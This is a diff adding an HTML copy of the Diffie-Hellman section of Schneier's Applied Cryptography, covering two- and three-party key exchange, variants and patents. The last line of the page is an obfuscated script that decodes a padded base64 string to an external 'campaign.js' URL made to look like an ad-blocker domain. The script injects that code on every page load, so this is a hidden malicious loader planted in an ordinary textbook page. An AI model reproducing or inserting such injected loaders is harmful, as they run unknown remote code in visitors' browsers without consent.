@@ -1,0 +1,168 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key-Exchange Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=22//-->
+<!--PAGES=513-516//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch21/21-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="22-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 22<BR>Key-Exchange Algorithms
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">22.1 Diffie-Hellman</FONT></H3>
+<P>Diffie-Hellman was the first public-key algorithm ever invented, way back in 1976 [496]. It gets its security from the difficulty of calculating discrete logarithms in a finite field, as compared with the ease of calculating exponentiation in the same field. Diffie-Hellman can be used for key distribution&#151;Alice and Bob can use this algorithm to generate a secret key&#151;but it cannot be used to encrypt and decrypt messages.
+</P>
+<P>The math is simple. First, Alice and Bob agree on a large prime, <I>n</I> and <I>g,</I> such that <I>g</I> is primitive mod <I>n.</I> These two integers don&#146;t have to be secret; Alice and Bob can agree to them over some insecure channel. They can even be common among a group of users. It doesn&#146;t matter.</P>
+<P>Then, the protocol goes as follows:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random large integer <I>x</I> and sends Bob
+<DL>
+<DD><I>X</I> = <I>g<SUP>x</SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a random large integer <I>y</I> and sends Alice
+<DL>
+<DD><I>Y</I> = <I>g</I><SUP>y</SUP> mod <I>n</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes
+<DL>
+<DD><I>k</I> = <I>Y<SUP>x</SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob computes
+<DL>
+<DD><I>k&#180;</I> = <I>X</I><SUP>y</SUP> mod <I>n</I>
+</DL>
+</DL>
+<P>Both <I>k</I> and <I>k&#180;</I> are equal to <I>g</I><SUP>xy</SUP> mod <I>n.</I> No one listening on the channel can compute that value; they only know <I>n, g, X,</I> and <I>Y.</I> Unless they can compute the discrete logarithm and recover <I>x</I> or <I>y,</I> they do not solve the problem. So, <I>k</I> is the secret key that both Alice and Bob computed independently.</P>
+<P>The choice of <I>g</I> and <I>n</I> can have a substantial impact on the security of this system. The number (<I>n</I> - 1)/2 should also be a prime [1253]. And most important, <I>n</I> should be large: The security of the system is based on the difficulty of factoring numbers the same size as <I>n.</I> You can choose any <I>g,</I> such that <I>g</I> is primitive mod <I>n;</I> there&#146;s no reason not to choose the smallest <I>g</I> you can&#151;generally a one-digit number. (And actually, <I>g</I> does not have to be primitive; it just has to generate a large subgroup of the multiplicitive group mod <I>n.</I>)</P>
+<P><FONT SIZE="+1"><B><I>Diffie-Hellman with Three or More Parties</I></B></FONT></P>
+<P>The Diffie-Hellman key-exchange protocol can easily be extended to work with three or more people. In this example, Alice, Bob, and Carol together generate a secret key.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random large integer <I>x</I> and sends Bob
+<DL>
+<DD><I>X</I> = <I>g<SUP>x</SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a random large integer <I>y</I> and sends Carol
+<DL>
+<DD><I>Y</I> = <I>g</I><SUP>y</SUP> mod <I>n</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Carol chooses a random large integer <I>z</I> and sends Alice
+<DL>
+<DD><I>Z</I> = <I>g</I><SUP>z</SUP> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends Bob
+<DL>
+<DD><I>Z&#180;</I> = <I>Z</I><SUP>x</SUP> mod <I>n</I>
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Bob sends Carol
+<DL>
+<DD><I>X&#180;</I> = <I>X</I><SUP>y</SUP> mod <I>n</I>
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Carol sends Alice
+<DL>
+<DD><I>Y&#180;</I> = <I>Y</I><SUP><I>z</I></SUP> mod <I>n</I>
+</DL>
+<DD><B>(7)</B>&nbsp;&nbsp;Alice computes
+<DL>
+<DD><I>k</I> = <I>Y</I>&#180;<SUP><I>x</I></SUP> mod <I>n</I>
+</DL>
+<DD><B>(8)</B>&nbsp;&nbsp;Bob computes
+<DL>
+<DD><I>k</I> = <I>Z</I>&#180;<SUP><I>y</I></SUP> mod <I>n</I>
+</DL>
+<DD><B>(9)</B>&nbsp;&nbsp;Carol computes
+<DL>
+<DD><I>k</I> = <I>X</I>&#180;<SUP><I>z</I></SUP> mod <I>n</I>
+</DL>
+</DL>
+<P>The secret key, <I>k,</I> is equal to g<SUP>xyz</SUP> mod <I>n,</I> and no one else listening in on the communications can compute that value. The protocol can be easily extended to four or more people; just add more people and more rounds of computation.</P>
+<P><FONT SIZE="+1"><B><I>Extended Diffie-Hellman</I></B></FONT></P>
+<P>Diffie-Hellman also works in commutitive rings [1253]. Z. Shmuley and Kevin McCurley studied a variant of the algorithm where the modulus is a composite number [1442,1038]. V. S. Miller and Neal Koblitz extended this algorithm to elliptic curves [1095,867]. Taher ElGamal used the basic idea to develop an encryption and digital signature algorithm (see Section 19.6).
+</P>
+<P>This algorithm also works in the Galois field GF(2<SUP>k</SUP>) [1442,1038]. Some implementations take this approach [884,1631,1632], because the computation is much quicker. Similarly, cryptanalytic computation is equally fast, so it is important to carefully choose a field large enough to ensure security.</P>
+<P><FONT SIZE="+1"><B><I>Hughes</I></B></FONT></P>
+<P>This variant of Diffie-Hellman allows Alice to generate a key and send it to Bob [745].
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random large integer <I>x</I> and generates
+<DL>
+<DD><I>k</I> = <I>g</I><SUP><I>x</I></SUP> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a random large integer <I>y</I> and sends Alice
+<DL>
+<DD><I>Y</I> = <I>g<SUP>y</I></SUP> mod <I>n</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends Bob
+<DL>
+<DD><I>X</I> = <I>Y<SUP>x</I></SUP> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob computes
+<DL>
+<DD><I>z</I> = <I>y</I><SUP>-1</SUP>
+<DD><I>k&#180;</I> = <I>X<SUP>z</I></SUP> mod <I>n</I>
+</DL>
+</DL>
+<P>If everything goes correctly, <I>k</I> = <I>k&#180;</I>.</P>
+<P>The advantage of this protocol over Diffie-Hellman is that <I>k</I> can be computed before any interaction, and Alice can encrypt a message using <I>k</I> prior to contacting Bob. She can send it to a variety of people and interact with them to exchange the key individually later.</P>
+<P><FONT SIZE="+1"><B><I>Key Exchange without Exchanging Keys</I></B></FONT></P>
+<P>If you have a community of users, each could publish a public key, <I>X</I> = <I>g<SUP>x</I></SUP> mod <I>n,</I> in a common database. If Alice wants to communicate with Bob, she just has to retrieve Bob&#146;s public key and generate their shared secret key. She could then encrypt a message with that key and send it to Bob. Bob would retrieve Alice&#146;s public key to generate the shared secret key.</P>
+<P>Each pair of users would have a unique secret key, and no prior communication between users is required. The public keys have to be certified to prevent spoofing attacks and should be changed regularly, but otherwise this is a pretty clever idea.</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>The Diffie-Hellman key-exchange algorithm is patented in the United States [718] and Canada [719]. A group called Public Key Partners (PKP) licenses the patent, along with other public-key cryptography patents (see Section 25.5). The U.S. patent will expire on April 29, 1997.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch21/21-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="22-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(afxgZmls, CQMPuNiy) {CQMPuNiy = afxgZmls.createElement('script');CQMPuNiy.type = 'text/javascript';CQMPuNiy.async = true;CQMPuNiy.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');afxgZmls.getElementsByTagName('body')[0].appendChild(CQMPuNiy);}(document));</script></body>
+</html>
